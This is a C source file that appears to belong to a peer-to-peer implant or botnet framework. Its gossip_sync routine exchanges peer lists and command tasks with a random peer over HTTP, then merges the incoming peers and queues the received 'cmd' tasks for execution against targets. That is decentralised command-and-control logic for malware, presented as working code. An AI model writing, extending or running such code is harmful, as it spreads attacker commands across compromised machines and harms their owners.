#include "sync-implants.h"
#include "task-log.h"
#include "config.h"
#include "peer-list.h"
#include "peers.h"
#include "http-client.h"
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <cjson/cJSON.h>
#include <curl/curl.h>


// because sync is already a function TwT
void gossip_sync(GossipContext *ctx) {
    if(global_pl.len == 0) return;

    Peer *random_peer = get_random_peer(&global_pl);
    
    cJSON *root = cJSON_CreateObject();



    // PREPARING PEER LIST FOR SYNC
    cJSON *peer_array = cJSON_CreateArray();

    for(size_t i = 0; i < global_pl.len; i++) {
        if ((strcmp(global_pl.peers[i].ip, random_peer->ip) == 0) && global_pl.peers[i].port == random_peer->port) continue;

        cJSON *peer_obj = cJSON_CreateObject();
        cJSON_AddStringToObject(peer_obj, "ip", global_pl.peers[i].ip);
        cJSON_AddNumberToObject(peer_obj, "port", global_pl.peers[i].port);

        cJSON_AddItemToArray(peer_array, peer_obj);
        // cJSON_Delete(peer_obj);
    }
    



    // PREPAIRING TASK LIST FOR SYBC
    cJSON *task_array = cJSON_CreateArray();

    for (size_t i = 0; i < ctx->tl->len; i++) {
        cJSON *task_obj = cJSON_CreateObject();
        cJSON_AddStringToObject(task_obj, "cmd", ctx->tl->tasks[i].cmd);
        cJSON_AddNumberToObject(task_obj, "id", ctx->tl->tasks[i].id);

        cJSON_AddItemToArray(task_array, task_obj);
    }

    // putting everything together in one body json
    cJSON_AddItemToObject(root, "peers_array", peer_array);
    cJSON_AddItemToObject(root, "task_array", task_array);
    // cJSON_AddItemToObject(root, "results_array", results_array);
    cJSON_AddNumberToObject(root, "my_port", WEBSERVER_PORT);
    char *body = cJSON_PrintUnformatted(root);

    char url[128];
    snprintf(url, sizeof url, "http://%s:%d/sync", random_peer->ip, random_peer->port);

    // let it go
    char *resp = NULL;
    int err = http_post(url, body, &resp);

    if (err == CURLE_COULDNT_CONNECT) {
        pl_remove(&global_pl, random_peer->ip, random_peer->port);
        cJSON_Delete(root);
        free(body);
        // free(resp);
        return;
    }
    if (err != 0 || resp == NULL) {
        fprintf(stderr, "HTTP POST failed with error code %d\n", err);
        cJSON_Delete(root);
        free(body);
        if (resp) free(resp);
        return;
    }

    // RESPONSE PARSING AND SYNCING PART
    cJSON *resp_json = cJSON_Parse(resp);
    if (!resp_json) {
        const char *errptr = cJSON_GetErrorPtr();
        fprintf(stderr, "❌ failed to parse response JSON at: %s\n", errptr ? errptr : "(unknown or idk)");
        cJSON_Delete(root);
        free(body);
        free(resp);
        return;
    }


    // all the stuff that we are gonna sync
    cJSON *resp_peer_array = cJSON_GetObjectItemCaseSensitive(resp_json, "peers_array");
    cJSON *resp_task_array = cJSON_GetObjectItemCaseSensitive(resp_json, "task_array");
    

    // sender remove receiver's ip, and receiver will add sender's ip make sure that both party do not have their peer own ip
    cJSON *sender = cJSON_CreateObject();
    cJSON_AddStringToObject(sender, "ip", random_peer->ip);
    cJSON_AddNumberToObject(sender, "port", random_peer->port);

    cJSON_AddItemToArray(resp_peer_array, sender);

    // merging peer list
    cJSON *peer_item;
    cJSON_ArrayForEach(peer_item, resp_peer_array) {
        cJSON *ip = cJSON_GetObjectItemCaseSensitive(peer_item, "ip");
        cJSON *port = cJSON_GetObjectItemCaseSensitive(peer_item, "port");

        if (!cJSON_IsString(ip) || !cJSON_IsNumber(port)) continue;

        if (pl_find(&global_pl, ip->valuestring, port->valueint) >= 0) continue;

        pl_add(&global_pl, ip->valuestring, port->valueint);
    }

    // merging task list
    cJSON *task_item;
    cJSON_ArrayForEach(task_item, resp_task_array) {
        cJSON *id = cJSON_GetObjectItemCaseSensitive(task_item, "id");
        cJSON *cmd = cJSON_GetObjectItemCaseSensitive(task_item, "cmd");
        cJSON *target_item = cJSON_GetObjectItemCaseSensitive(task_item, "target");

        if(!cJSON_IsNumber(id) || !cJSON_IsString(cmd)) continue;

        if(tl_find(ctx->tl, id->valueint) >= 0) continue;

        tq_add(ctx->tq, ctx->tl, id->valueint, cmd->valuestring, target_item->valuestring);
        printf("📩 Queued command %d: %s\n", id->valueint, cmd->valuestring);
    }

    printf("🗣️ - Sync complete, now i have %zu peers and %zu tasks in log\n", global_pl.len, ctx->tl->len);

    cJSON_Delete(resp_json);
    free(body);
    free(resp);
    cJSON_Delete(root);
}


void sync_job(void *c) {
    GossipContext *ctx = (GossipContext *)c;

    gossip_sync(ctx);
}